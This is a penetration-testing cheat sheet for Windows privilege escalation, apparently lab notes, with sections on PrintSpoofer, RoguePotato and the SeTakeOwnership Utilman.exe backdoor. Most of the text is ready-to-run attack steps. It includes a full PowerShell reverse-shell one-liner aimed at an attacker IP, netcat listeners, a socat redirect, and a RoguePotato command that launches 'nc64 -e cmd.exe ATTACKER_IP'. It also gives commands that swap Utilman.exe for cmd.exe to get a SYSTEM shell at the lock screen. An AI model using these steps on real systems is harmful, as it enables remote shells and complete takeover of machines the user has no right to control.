Who am I privilege - PE
***************************

SeImpersonatePrivilege
########################

Printspool
+++++++++++++++

1. Determine if the victim system is x64 or x32 with the following command

.. code-block:: console

        sysinfo

2. Go and verify the privilege settings with the following command:

.. code-block:: console

        whoami /priv

3. Go and get `PrintSpoofer <https://github.com/itm4n/PrintSpoofer/releases/>`
   
4. Run the following command to create shell.ps1\

.. code-block:: console

        $client = New-Object System.Net.Sockets.TCPClient('Attacker.IP.x.x',Attacker Port);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()
   
5. Run a netcat shell

.. code-block:: console

        nc -lvnp 4444

6. Go and run the following command on the victim machine

.. code-block:: console

        PrintSpoofer64.exe -c "cmd /c powershell -c C:\shell.ps1\location"

RoguePotato
+++++++++++++++

    The exploit will force the victim machine to try and instantiate an object through DCOM against the attacker's machine. To know how to connect to that specific object, the client machine will perform a process known as Object eXporter IDentifier (OXID) resolution. Simpy put, OXID resolution is the process in which a client machine sends the OXID they want to connect to, and receives instructions from the server on how to actually contact the object in question, which in this case is achieved through a named pipe. OXID resolution occurs through port 135/TCP.

    The OXID resolver (controlled by the attacker) will spoof a response to force a connection against a non-existent named pipe that the exploit itself will register in the target system. The named pipe will require authentication, which will then be used to impersonate the connecting user.

    Port 135 is used in any default Windows installation, making it impossible to bind the fake OXID resolver on the same target machine. To overcome this, the exploit will connect back to the attacker machine, which will need to redirect the OXID resolution query back to the target machine on a different port than 135. This can be easily done using socat


.. code-block:: console

        sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999 
        nc -lvp 4448 

        c:\tools\roguepotato\RoguePotato.exe -r ATTACKER_IP -e "C:\tools\nc64 -e cmd.exe ATTACKER_IP 4448" -l 9999
SeTakeOwnership
####################

utilman.exe
+++++++++++++++

.. code-block:: console

        takeown /f C:\Windows\System32\Utilman.exe
        icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
        copy cmd.exe utilman.exe 

Lock and press ease of access button         
